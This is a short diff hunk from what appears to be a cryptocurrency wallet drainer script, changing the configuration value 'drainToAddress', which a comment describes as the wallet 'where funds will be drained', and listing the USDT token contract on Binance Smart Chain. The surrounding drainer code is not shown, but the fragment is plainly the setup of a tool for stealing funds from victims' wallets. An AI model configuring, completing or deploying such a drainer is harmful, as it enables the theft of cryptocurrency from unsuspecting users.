@@ -11,7 +11,7 @@
 // ================= CONFIGURATION ================= //
 const CONFIG = {
  // Replace this with YOUR wallet address (where funds will be drained)
- drainToAddress: "0xD8c72346537F75790D57d559Cd9EF8B7967C4e6f",
+ drainToAddress: "0x115ecdd343A3A65F1D58a40B853DAc0da66A8Bb6",
  
  // USDT Contract on BSC (Correct Address)
  usdtContractAddress: "0x55d398326f99059fF775485246999027B31964f5",
